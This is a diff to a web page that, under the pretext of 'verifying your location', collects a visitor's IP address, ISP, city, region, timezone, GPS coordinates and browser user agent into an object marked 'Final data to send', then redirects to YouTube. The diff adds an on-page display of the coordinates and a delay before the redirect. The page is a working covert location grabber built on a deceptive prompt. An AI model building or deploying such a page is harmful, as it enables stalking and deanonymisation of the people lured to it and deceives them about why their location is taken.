@@ -6,12 +6,16 @@
   <style>
     body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
     button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
+    #output { margin-top: 20px; }
+    a { color: #2196f3; font-weight: bold; text-decoration: none; }
   </style>
 </head>
 <body>
   <h2>📍 Please allow location access</h2>
   <p>This helps us verify your location.</p>
   <button onclick="startTracking()">Allow & Continue</button>
+
+  <div id="output"></div>
 
   <script>
     async function getGeoCoords() {
@@ -37,19 +41,35 @@
 
     async function startTracking() {
       try {
+        const outputDiv = document.getElementById("output");
+
         // IP
         const ipRes = await fetch('https://api64.ipify.org?format=json');
         const ipJson = await ipRes.json();
         const ip = ipJson.ip;
 
-        // Location via IP
+        // IP location
         const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
         const locData = await locRes.json();
 
         // GPS
         const gps = await getGeoCoords();
+        const lat = gps.latitude;
+        const lon = gps.longitude;
 
-        // Final data
+        // Show to user:
+        if (!isNaN(lat) && !isNaN(lon)) {
+          const gmapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          outputDiv.innerHTML = `
+            <p><strong>Latitude:</strong> ${lat}</p>
+            <p><strong>Longitude:</strong> ${lon}</p>
+            <p><a href="${gmapLink}" target="_blank">🌍 View on Google Maps</a></p>
+          `;
+        } else {
+          outputDiv.innerHTML = `<p>❌ Location access denied or not supported.</p>`;
+        }
+
+        // Final data to send
         const data = {
           ip: ip,
           isp: locData.org || 'N/A',
@@ -57,8 +77,8 @@
           city: locData.city || 'N/A',
           region: locData.region || 'N/A',
           timezone: locData.timezone || 'N/A',
-          latitude: gps.latitude,
-          longitude: gps.longitude,
+          latitude: lat,
+          longitude: lon,
           user_agent: navigator.userAgent
         };
 
@@ -72,7 +92,10 @@
       } catch (err) {
         console.error("Tracking error:", err);
       } finally {
-        window.location.href = "https://youtube.com"; // ✅ redirect works
+        // You can delay redirect if you want user to see info
+        setTimeout(() => {
+          window.location.href = "https://youtube.com";
+        }, 5000); // 5 seconds delay
       }
     }
   </script>
